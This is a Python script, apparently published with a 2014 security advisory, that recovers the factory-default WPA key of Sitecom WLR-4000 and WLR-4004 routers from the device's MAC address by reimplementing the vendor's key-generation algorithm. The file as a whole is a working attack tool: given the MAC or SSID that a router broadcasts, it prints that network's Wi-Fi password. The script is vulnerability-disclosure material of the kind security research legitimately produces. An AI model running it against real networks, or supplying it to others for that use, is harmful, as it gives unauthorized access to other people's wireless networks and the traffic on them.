# 
# Default WPA key generator for Sitecom WLR-4000/4004 routers
# ===========================================================
#
# Authors: 
#   Roberto Paleari     (@rpaleari)
#   Alessandro Di Pinto (@adipinto)
#
# Advisory URL:
#   http://blog.emaze.net/2014/04/sitecom-firmware-and-wifi.html
# 

import argparse
import os
import logging
import sys

# Charsets used for the generation of WPA key by different Sitecom models
CHARSETS = {
    "4000": (
        "23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ",
        "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"
    ),

    "4004": (
        "JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK", 
        "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"
    ),
}

def generateKey(mac, model, keylength = 12):
    global CHARSETS
    assert model in CHARSETS
    
    charset1, charset2 = CHARSETS[model]
    assert len(charset1) == len(charset2)

    mac = mac.replace(":", "").decode("hex")
    assert len(mac) == 6

    val = int(mac[2:6].encode("hex"), 16)

    magic1 = 0x98124557
    magic2 = 0x0004321a
    magic3 = 0x80000000

    offsets = []
    for i in range(keylength):
        if (val & 0x1) == 0:
            val = val ^ magic2
            val = val >> 1
        else:
            val = val ^ magic1
            val = val >> 1
            val = val | magic3

        offset = val % len(charset1)
        offsets.append(offset)

    wpakey = ""
    wpakey += charset1[offsets[0]]

    for i in range(0, keylength-1):
        magic3 = offsets[i]
        magic1 = offsets[i+1]

        if magic3 != magic1:
            magic3 = charset1[magic1]
        else:
            magic3 = (magic3 + i) % len(charset1)
            magic3 = charset2[magic3]
        wpakey += magic3

    return wpakey
        

def main():
    global CHARSETS

    # Parse command-line arguments
    parser = argparse.ArgumentParser(formatter_class = 
                                     argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-m", "--model", choices = CHARSETS.keys(),
                        required = True, help = "device model")
    parser.add_argument('mac', help = "MAC address")
    args = parser.parse_args()

    # Configure logging
    logging.basicConfig(format = '[%(asctime)s] %(levelname)s : %(message)s',
                        level = logging.DEBUG)

    # Generate SSID and WPA key
    ssid = "Sitecom%s" % args.mac.replace(":", "")[6:].upper()
    wpa = generateKey(args.mac, args.model)

    print "MAC:  %s" % args.mac
    print "SSID: %s" % ssid
    print "WPA:  %s" % wpa


if __name__ == "__main__":
    main()